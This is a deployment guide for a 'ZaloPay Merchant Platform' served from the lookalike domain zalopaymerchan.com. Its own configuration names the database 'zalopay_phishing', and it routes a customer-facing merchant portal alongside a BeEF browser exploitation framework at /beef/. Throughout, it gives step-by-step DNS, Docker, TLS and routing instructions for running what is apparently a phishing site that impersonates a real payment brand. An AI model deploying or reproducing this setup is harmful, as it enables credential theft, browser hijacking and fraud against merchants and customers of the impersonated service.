# ZaloPay Merchant Platform - Deployment Guide

## Overview

This guide provides step-by-step instructions for deploying the ZaloPay Merchant Platform with proper routing architecture for merchant and admin interfaces.

## Server Configuration

- **Domain**: zalopaymerchan.com
- **Server IP**: 221.120.163.129
- **Ports**: 80 (HTTP), 443 (HTTPS), 8000 (Backend), 3000 (BeEF)

## Prerequisites

### 1. DNS Configuration

Configure your domain's DNS A record:

```
Type: A
Host: @
Value: 221.120.163.129
TTL: 3600 (or automatic)

Type: A
Host: www
Value: 221.120.163.129
TTL: 3600 (or automatic)
```

**Verification**:
```bash
# Check DNS propagation
dig zalopaymerchan.com +short
# Should return: 221.120.163.129

# Check www subdomain
dig www.zalopaymerchan.com +short
# Should return: 221.120.163.129
```

### 2. Server Requirements

- **OS**: Ubuntu 20.04+ or similar Linux distribution
- **RAM**: Minimum 4GB, Recommended 8GB+
- **Storage**: Minimum 20GB free space
- **Software**:
  - Docker Engine 20.10+
  - Docker Compose 2.0+
  - Git

### 3. Firewall Configuration

Open required ports:
```bash
# Allow HTTP
sudo ufw allow 80/tcp

# Allow HTTPS
sudo ufw allow 443/tcp

# Allow SSH (if not already enabled)
sudo ufw allow 22/tcp

# Enable firewall
sudo ufw enable
```

## Deployment Steps

### Step 1: Clone Repository

```bash
# Clone the repository
git clone https://github.com/hoanganh-hue/hehe.git
cd hehe
```

### Step 2: Configure Environment

```bash
# Run configuration script
./scripts/configure_deployment.sh

# Edit .env file with your credentials
nano .env
```

**Required Environment Variables**:
```env
# Domain Configuration
DOMAIN=zalopaymerchan.com

# Database Configuration
MONGODB_ROOT_USERNAME=admin
MONGODB_ROOT_PASSWORD=your_secure_password_here
MONGODB_DATABASE=zalopay_phishing

# Redis Configuration
REDIS_PASSWORD=your_redis_password_here

# Security Configuration
JWT_SECRET_KEY=your_jwt_secret_key_here
ENCRYPTION_KEY=your_encryption_key_here

# BeEF Configuration
BEEF_USER=beef
BEEF_PASSWORD=your_beef_password_here

# SSL Configuration (for production)
SSL_EMAIL=admin@zalopaymerchan.com

# OAuth Configuration (if using)
GOOGLE_CLIENT_ID=your_google_client_id
GOOGLE_CLIENT_SECRET=your_google_client_secret
```

**Generate Secure Keys**:
```bash
# Generate JWT secret (32 characters)
openssl rand -hex 32

# Generate encryption key (32 characters)
openssl rand -hex 32
```

### Step 3: Build and Deploy

```bash
# Build all Docker images
docker compose build

# Start all services
docker compose up -d

# View logs
docker compose logs -f
```

### Step 4: Verify Deployment

#### Check Service Status
```bash
docker compose ps
```

All services should show "Up" status:
- mongodb-primary
- mongodb-secondary-1
- mongodb-secondary-2
- redis-primary
- redis-replica
- influxdb
- beef
- backend
- frontend
- nginx
- certbot (if running in production profile)

#### Test Routing

1. **Root Router Page**:
```bash
curl -I http://zalopaymerchan.com/
# Should return 200 OK
```

2. **Merchant Interface**:
```bash
curl -I http://zalopaymerchan.com/merchant/
# Should return 200 OK
```

3. **Admin Interface**:
```bash
curl -I http://zalopaymerchan.com/admin/
# Should return 200 OK
```

4. **Backend API Health**:
```bash
curl http://zalopaymerchan.com/api/health
# Should return {"status": "healthy"}
```

5. **BeEF Framework**:
```bash
curl -I http://zalopaymerchan.com/beef/
# Should return 200 OK or 301/302
```

#### Browser Testing

1. **Visit Root**: http://zalopaymerchan.com/
   - Should show router/landing page
   - Should have two cards: "Merchant Portal" and "Admin Portal"

2. **Test Merchant Portal**: http://zalopaymerchan.com/merchant/
   - Should show merchant interface
   - Check for proper styling and functionality

3. **Test Admin Portal**: http://zalopaymerchan.com/admin/
   - Should show admin login or dashboard
   - Verify authentication is required

4. **Test Auto-Routing**:
   - Visit http://zalopaymerchan.com/?route=merchant
   - Should automatically redirect to merchant interface
   - Visit http://zalopaymerchan.com/?route=admin
   - Should automatically redirect to admin interface

### Step 5: SSL/TLS Setup (Production)

For production deployment with HTTPS:

```bash
# Update docker-compose.yml to use production profile
docker compose --profile production up -d

# Run Certbot to obtain SSL certificates
docker compose run --rm certbot certonly \
  --webroot \
  --webroot-path=/var/www/certbot \
  --email admin@zalopaymerchan.com \
  --agree-tos \
  --no-eff-email \
  -d zalopaymerchan.com \
  -d www.zalopaymerchan.com

# Update nginx to use production configuration
# Edit docker-compose.yml to mount production.conf instead of default.conf

# Restart nginx to apply SSL configuration
docker compose restart nginx
```

Verify SSL:
```bash
curl -I https://zalopaymerchan.com/
# Should return 200 OK with HTTPS
```

## Architecture Verification

### 1. Routing Logic

The platform implements a three-tier routing architecture:

```
┌─────────────────────────────────────────┐
│  Root (/)                               │
│  Router/Landing Page                    │
│  - Auto-detection based on session     │
│  - Manual selection                     │
└─────────────┬───────────────────────────┘
              │
     ┌────────┴────────┐
     │                 │
┌────▼────┐      ┌────▼────┐
│Merchant │      │  Admin  │
│ Portal  │      │ Portal  │
│         │      │         │
│Customer │      │  Mgmt   │
│  Facing │      │Dashboard│
└─────────┘      └─────────┘
     │                 │
     └────────┬────────┘
              │
         ┌────▼────┐
         │ Backend │
         │   API   │
         └─────────┘
```

### 2. Nginx Configuration Flow

```
Internet → Nginx Load Balancer (Port 80/443)
           ├─ / → Frontend Router (index.html)
           ├─ /merchant/ → Frontend Merchant Interface
           ├─ /admin/ → Frontend Admin Interface
           ├─ /api/ → Backend API (Port 8000)
           └─ /beef/ → BeEF Framework (Port 3000)
```

### 3. Container Communication

```
┌──────────────┐
│    Nginx     │ (Load Balancer)
└──────┬───────┘
       │
   ┌───┴────────────────────┐
   │                        │
┌──▼──────┐          ┌──────▼───┐
│Frontend │          │ Backend  │
│Container│◄────────►│Container │
└─────────┘          └──────┬───┘
                            │
               ┌────────────┼────────────┐
               │            │            │
           ┌───▼───┐   ┌───▼───┐   ┌───▼────┐
           │MongoDB│   │ Redis │   │InfluxDB│
           └───────┘   └───────┘   └────────┘
```

## Troubleshooting

### Issue 1: DNS Not Resolving

**Symptoms**: Cannot access domain, DNS lookup fails

**Solutions**:
```bash
# Check DNS propagation
dig zalopaymerchan.com +short

# Force DNS refresh (if needed)
sudo systemd-resolve --flush-caches

# Test with IP directly
curl http://221.120.163.129/
```

### Issue 2: Nginx Returns 502 Bad Gateway

**Symptoms**: Nginx running but returns 502 error

**Solutions**:
```bash
# Check if backend is running
docker compose ps backend

# Check backend logs
docker compose logs backend

# Restart backend
docker compose restart backend

# Check frontend is running
docker compose ps frontend

# Restart all services
docker compose restart
```

### Issue 3: Routing Not Working

**Symptoms**: Root page shows but merchant/admin routes fail

**Solutions**:
```bash
# Check nginx configuration
docker compose exec nginx nginx -t

# Check frontend nginx configuration
docker compose exec frontend nginx -t

# View nginx access logs
docker compose logs nginx

# Restart nginx
docker compose restart nginx frontend
```

### Issue 4: BeEF Not Accessible

**Symptoms**: Cannot access /beef/ endpoint

**Solutions**:
```bash
# Check BeEF is running
docker compose ps beef

# Check BeEF logs
docker compose logs beef

# Verify proxy configuration
docker compose exec nginx cat /etc/nginx/nginx.conf | grep beef

# Restart BeEF
docker compose restart beef
```

### Issue 5: Database Connection Errors

**Symptoms**: Backend fails to connect to MongoDB or Redis

**Solutions**:
```bash
# Check database services
docker compose ps mongodb-primary redis-primary

# Check MongoDB health
docker compose exec mongodb-primary mongosh --eval "db.adminCommand('ping')"

# Check Redis health
docker compose exec redis-primary redis-cli ping

# Restart databases
docker compose restart mongodb-primary redis-primary

# Check backend environment variables
docker compose exec backend env | grep MONGO
docker compose exec backend env | grep REDIS
```

## Monitoring and Maintenance

### Health Checks

Create a monitoring script (`scripts/health_check.sh`):
```bash
#!/bin/bash
echo "Checking ZaloPay Merchant Platform Health..."

# Check root router
curl -s -o /dev/null -w "%{http_code}" http://zalopaymerchan.com/
echo " - Root router: $?"

# Check merchant
curl -s -o /dev/null -w "%{http_code}" http://zalopaymerchan.com/merchant/
echo " - Merchant: $?"

# Check admin
curl -s -o /dev/null -w "%{http_code}" http://zalopaymerchan.com/admin/
echo " - Admin: $?"

# Check API
curl -s http://zalopaymerchan.com/api/health
echo " - API: $?"

# Check containers
docker compose ps
```

### Log Monitoring

```bash
# View all logs
docker compose logs -f

# View specific service logs
docker compose logs -f nginx
docker compose logs -f backend
docker compose logs -f frontend

# View logs with timestamp
docker compose logs -f --timestamps

# View last 100 lines
docker compose logs --tail=100
```

### Performance Monitoring

```bash
# Check resource usage
docker stats

# Check disk usage
docker system df

# Clean up unused resources
docker system prune -f
```

## Backup and Recovery

### Backup Script
```bash
#!/bin/bash
BACKUP_DIR="/backups/zalopay_$(date +%Y%m%d_%H%M%S)"
mkdir -p $BACKUP_DIR

# Backup MongoDB
docker compose exec -T mongodb-primary mongodump --archive > $BACKUP_DIR/mongodb.archive

# Backup Redis
docker compose exec -T redis-primary redis-cli --rdb $BACKUP_DIR/redis.rdb

# Backup configuration
cp -r .env nginx/ frontend/ backend/ $BACKUP_DIR/

echo "Backup completed: $BACKUP_DIR"
```

### Restore Script
```bash
#!/bin/bash
BACKUP_DIR=$1

# Restore MongoDB
docker compose exec -T mongodb-primary mongorestore --archive < $BACKUP_DIR/mongodb.archive

# Restart services
docker compose restart
```

## Security Best Practices

1. **Change Default Passwords**: Update all default passwords in .env
2. **Enable Firewall**: Use ufw or iptables to restrict access
3. **SSL/TLS Only**: In production, force HTTPS for all traffic
4. **Regular Updates**: Keep Docker images and dependencies updated
5. **Log Monitoring**: Regularly review logs for suspicious activity
6. **Backup Regularly**: Implement automated backup schedule
7. **Access Control**: Restrict admin interface to specific IP ranges

## Support and Documentation

- **Routing Architecture**: See `ROUTING_ARCHITECTURE.md`
- **System Architecture**: See `comprehensive-system-architecture.md`
- **Database Schema**: See `database-schema-documentation.md`
- **Integration Guide**: See `BACKEND_FRONTEND_INTEGRATION.md`

## Updates and Maintenance

### Update Application
```bash
# Pull latest changes
git pull origin main

# Rebuild containers
docker compose build

# Restart services
docker compose up -d
```

### Update SSL Certificates
```bash
# Renew certificates (auto-renews if within 30 days of expiry)
docker compose run --rm certbot renew

# Restart nginx to load new certificates
docker compose restart nginx
```

---

**Last Updated**: 2025-10-21  
**Version**: 1.0  
**Deployment Target**: zalopaymerchan.com (221.120.163.129)
